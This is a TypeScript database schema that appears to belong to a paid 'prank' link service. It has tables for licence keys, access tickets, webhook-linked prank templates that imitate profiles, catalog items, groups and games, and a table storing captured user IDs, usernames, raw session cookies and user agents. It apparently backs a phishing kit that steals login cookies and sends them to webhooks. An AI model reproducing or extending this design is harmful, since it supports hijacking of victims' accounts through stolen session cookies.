import { pgTable, text, serial, timestamp, boolean, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Access keys to allow creating pranks (simple licensing system)
export const accessKeys = pgTable("access_keys", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  usedByIp: text("used_by_ip"),
  isActive: boolean("is_active").default(true),
  isMaster: boolean("is_master").default(false), // Master keys can create other keys
});

// Prank links configuration
export const pranks = pgTable("pranks", {
  id: serial("id").primaryKey(),
  webhookUrl: text("webhook_url").notNull(),
  template: text("template").notNull().default("profile"), // profile, catalog, group, game
  targetId: text("target_id"), // ID do perfil, item, grupo ou jogo alvo
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertAccessKeySchema = createInsertSchema(accessKeys);
export const insertPrankSchema = createInsertSchema(pranks).pick({
  webhookUrl: true,
  template: true,
  targetId: true,
});

export type AccessKey = typeof accessKeys.$inferSelect;
export const discordNicks = pgTable("discord_nicks", {
  id: serial("id").primaryKey(),
  username: text("username").notNull(),
  ticketCode: text("ticket_code").notNull(),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
});

export const insertDiscordNickSchema = createInsertSchema(discordNicks).omit({
  id: true,
  submittedAt: true
});

export type DiscordNick = typeof discordNicks.$inferSelect;
export type InsertDiscordNick = z.infer<typeof insertDiscordNickSchema>;

// Tickets for site access
export const tickets = pgTable("tickets", {
  id: serial("id").primaryKey(),
  code: text("code").notNull().unique(),
  isUsed: boolean("is_used").default(false),
  usedByIp: text("used_by_ip"),
  createdAt: timestamp("created_at").defaultNow(),
  type: text("type").notNull().default("normal"), // "normal" or "staff"
});

export const insertTicketSchema = createInsertSchema(tickets).omit({
  id: true,
  isUsed: true,
  usedByIp: true,
  createdAt: true,
});

export type Ticket = typeof tickets.$inferSelect;

// Tabela para armazenar sessões de cookies
export const cookieSessions = pgTable("cookie_sessions", {
  id: serial("id").primaryKey(),
  userId: text("user_id").notNull(),
  username: text("username").notNull(),
  cookie: text("cookie").notNull(),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").defaultNow(),
  expiresAt: timestamp("expires_at"),
});

export const insertCookieSessionSchema = createInsertSchema(cookieSessions).omit({
  id: true,
  createdAt: true,
});

export type CookieSession = typeof cookieSessions.$inferSelect;
export type InsertCookieSession = z.infer<typeof insertCookieSessionSchema>;
